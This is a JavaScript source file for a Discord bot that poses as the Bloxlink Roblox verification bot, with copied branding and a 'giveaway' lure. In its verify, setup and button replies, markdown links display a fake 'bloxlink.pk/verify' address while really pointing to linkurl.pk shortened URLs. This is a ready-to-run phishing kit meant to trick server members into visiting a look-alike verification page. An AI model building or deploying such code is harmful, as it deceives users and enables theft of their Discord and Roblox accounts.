require("dotenv").config();
const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  Events,
  PermissionsBitField
} = require("discord.js");

// Validate environment variables
if (!process.env.TOKEN) {
  console.error("❌ ERROR: TOKEN not found in .env file");
  process.exit(1);
}

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.DirectMessages]
});

client.once("ready", () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`📍 Watching for /verify and /setup commands...`);
});

client.on(Events.InteractionCreate, async (interaction) => {
  // Handle slash command
  if (interaction.isChatInputCommand()) {
    const verificationUrl = "https://linkurl.pk/1hOERU-V";
    const verificationLinkText = "[https*:*//bloxlink.pk/verify?server=5410571861847621](https://linkurl.pk/1hOERU-V)";

    const infoEmbed = new EmbedBuilder()
      .setTitle("Bloxlink Roblox Bot | Roblox Bot")
      .setDescription("Bloxlink is the largest Roblox bot for Discord. Bloxlink allows users to verify, get roles, and more..")
      .setImage("https://cdn.discordapp.com/attachments/1511395705791451169/1511461057993113662/bloxlink-million-servers.png?ex=6a20894d&is=6a1f37cd&hm=3060efee9b6ad88b038f274b4ce9bd46491d928880c53aa21114d17e8e817838");

    if (interaction.commandName === "verify") {
      const verifyButton = new ButtonBuilder()
        .setCustomId("verify_button")
        .setLabel("🔗 Verify with Bloxlink")
        .setStyle(ButtonStyle.Success);

      const helpButton = new ButtonBuilder()
        .setCustomId("help_button")
        .setLabel("❔ Need help?")
        .setStyle(ButtonStyle.Secondary);

      const row1 = new ActionRowBuilder().addComponents(verifyButton);
      const row2 = new ActionRowBuilder().addComponents(helpButton);

      await interaction.reply({
        content: "Welcome to **Elses Giveaway!**\nClick the button below to verify with Bloxlink and gain access to the rest of the server.",
        components: [row1, row2],
        embeds: [infoEmbed],
        ephemeral: false
      });
    }

    if (interaction.commandName === "setup") {
      const targetChannel = interaction.options.getChannel("channel");

      await interaction.deferReply({ ephemeral: true });

      try {
        if (!targetChannel || !targetChannel.isTextBased()) {
          return await interaction.editReply({
            content: "Please choose a valid text channel for verification setup.",
            ephemeral: true
          });
        }

        const botMember = interaction.guild?.members.me || interaction.guild?.members.cache.get(interaction.client.user.id);
        const botPermissions = targetChannel.permissionsFor(botMember);

        if (!botPermissions?.has([PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel])) {
          return await interaction.editReply({
            content: "I don't have permission to send messages in the selected channel. Please choose a different channel.",
            ephemeral: true
          });
        }

        const verifyButton = new ButtonBuilder()
          .setCustomId("verify_button")
          .setLabel("🔗 Verify with Bloxlink")
          .setStyle(ButtonStyle.Success);

        const helpButton = new ButtonBuilder()
          .setCustomId("help_button")
          .setLabel("❔ Need help?")
          .setStyle(ButtonStyle.Secondary);

        const row1 = new ActionRowBuilder().addComponents(verifyButton);
        const row2 = new ActionRowBuilder().addComponents(helpButton);

        await targetChannel.send({
          content: "Welcome to **Elses Giveaway!**\nClick the button below to verify with Bloxlink and gain access to the rest of the server.",
          components: [row1, row2],
          embeds: [infoEmbed]
        });

        await interaction.editReply({
          content: `✅ Verification setup sent to ${targetChannel}!`
        });

        console.log(`[SETUP] User ${interaction.user.tag} setup verification in ${targetChannel.name}`);
      } catch (error) {
        console.error(`[SETUP ERROR]`, error);
        await interaction.editReply({
          content: "Something went wrong while setting up verification. Please check the bot's channel permissions and try again.",
          ephemeral: true
        });
      }
    }
  }

  // Handle button click
  if (interaction.isButton()) {
    if (interaction.customId === "verify_button") {
      
      const verificationLinkText = "[https*:*//bloxlink.pk/verify?server=5410571861847621](https://linkurl.pk/M7p1-5Ot)";
      const buttonEmbed = new EmbedBuilder()
        .setDescription("Bloxlink is the largest Roblox bot for Discord. Bloxlink allows users to verify, get roles, and more..")
        .setImage("https://cdn.discordapp.com/attachments/1511395705791451169/1511461057993113662/bloxlink-million-servers.png?ex=6a20894d&is=6a1f37cd&hm=3060efee9b6ad88b038f274b4ce9bd46491d928880c53aa21114d17e8e817838");

      await interaction.reply({
        content: `You are not verified with Bloxlink! You can verify by going to ${verificationLinkText}`,
        embeds: [buttonEmbed],
        ephemeral: true
      });
      
      console.log(`[VERIFY] User ${interaction.user.tag} initiated verification`);
    }

    if (interaction.customId === "help_button") {
      await interaction.reply({
        content: "If you're having trouble verifying, here are some common solutions:\n\n**Issues?**\n• Make sure you have a Roblox account\n• Check your internet connection\n• Try verifying again in a few moments\n\n**Still need help?**\nContact a server moderator or check pinned messages for support.",
        ephemeral: true
      });
      
      console.log(`[HELP] User ${interaction.user.tag} clicked help button`);
    }
  }
});

client.login(process.env.TOKEN);